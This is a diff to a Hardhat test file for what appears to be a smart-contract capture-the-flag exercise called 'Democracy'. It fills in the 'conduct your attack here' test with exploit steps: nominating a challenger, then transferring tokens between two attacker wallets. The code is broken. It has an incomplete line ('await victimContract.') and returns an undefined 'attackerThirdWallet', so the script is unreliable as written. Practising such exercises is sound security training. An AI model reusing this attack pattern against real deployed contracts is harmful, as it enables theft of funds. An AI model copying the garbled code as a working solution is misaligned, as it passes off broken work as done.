@@ -10,23 +10,26 @@ const NAME = "Democracy";
 
 describe(NAME, function () {
   async function setup() {
-      const [owner, attackerWallet] = await ethers.getSigners();
+      const [owner, attackerWallet, attackerSecondWallet] = await ethers.getSigners();
       const value = ethers.utils.parseEther("1");
 
       const VictimFactory = await ethers.getContractFactory(NAME);
       const victimContract = await VictimFactory.deploy({ value });
 
-      return { victimContract, attackerWallet };
+      return { victimContract, attackerWallet, attackerSecondWallet, attackerThirdWallet };
   }
 
   describe("exploit", async function () {
-      let victimContract, attackerWallet;
+      let victimContract, attackerWallet, attackerSecondWallet;
       before(async function () {
-          ({ victimContract, attackerWallet } = await loadFixture(setup));
+          ({ victimContract, attackerWallet, attackerSecondWallet } = await loadFixture(setup));
       })
 
       it("conduct your attack here", async function () {
-          
+          await victimContract.nominateChallenger(attackerWallet.address);
+          await victimContract.
+          await victimContract.connect(attackerWallet).transferFrom(attackerWallet.address, attackerSecondWallet.address, 1);
+          await victimContract.connect(attackerWallet).transferFrom(attackerWallet.address, attackerSecondWallet.address, 2);
       });
 
       after(async function () {
